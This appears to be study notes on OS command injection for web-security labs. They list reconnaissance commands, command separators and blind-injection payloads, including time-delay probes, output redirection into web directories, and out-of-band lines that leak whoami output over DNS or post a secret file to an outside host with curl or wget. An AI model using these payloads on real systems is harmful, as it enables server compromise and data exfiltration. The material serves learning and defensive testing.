# Resources
- [Command Injection Playlist - Rana Khalil](https://www.youtube.com/playlist?list=PLuyTk2_mYISIP3vpjzVdNltKKUr27Nwtw)
- Michael Sommer videos
# What is it?
Execute commands of the server
# Reconnaissance - Where to look for it
- In request parameters
- User provided input
# Commands - Linux
- whoami = Name current user
- uname -a = Operating system
- ifconfig = Network configuration
- netstat -an = Network connections
- ps -ef = Running processes
# Commands - Windows
- whoami = Name current user
- ver = Operating system
- ifconfig /all = Network configuration
- netstat -an = Network connections
- tasklist = Running processes
# Where to look for them?
In request parameters
User provided input
# Command separators
There are wordlists to find multiple command separators
Windows and Unix-based systems
```
&
&&
|
||
```
Unix-based systems
```
;
0x0a - newline  
\n - newline 
`inject command`
$(inject command)
```
Comment Character
```
#
& whoami #
```
# Blind OS command injection vulnerabilities
The output of the command is not returned within the HTTP response of the application
The command might have to be URL encoded
- Detection via time delays: 
```bash
& ping -c 10 127.0.0.1 &
& sleep 10 #
```
- Redirecting the output
```bash
& whoami > /var/www/static/whoami.txt &
& whoami > /var/www/static/whoami.txt #
||whoami>/var/www/images/whoami.txt||
```
- Out-of-band techniques
```bash
& nslookup burp-collaborator &
& nslookup `whoami`.burp-collaborator #
|| nslookup `whoami`.burp-collaborator ||
curl --data @/home/carlos/secret subdomain.collaborator.net
wget --post-file /home/carlos/secret subdomain.collaborator.net
```
